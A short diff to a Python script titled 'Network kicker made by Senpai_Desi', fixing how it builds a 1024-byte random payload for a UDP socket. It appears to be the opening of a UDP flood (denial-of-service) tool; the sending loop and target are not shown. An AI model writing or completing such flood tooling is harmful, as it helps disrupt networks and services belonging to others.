@@ -1,7 +1,7 @@
 import socket
 import random
 sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(0, 1024)
+bytes = random._urandom(1024)
 print("-" * 100)
 print("Network kicker made by Senpai_Desi")
 print("-" * 100)
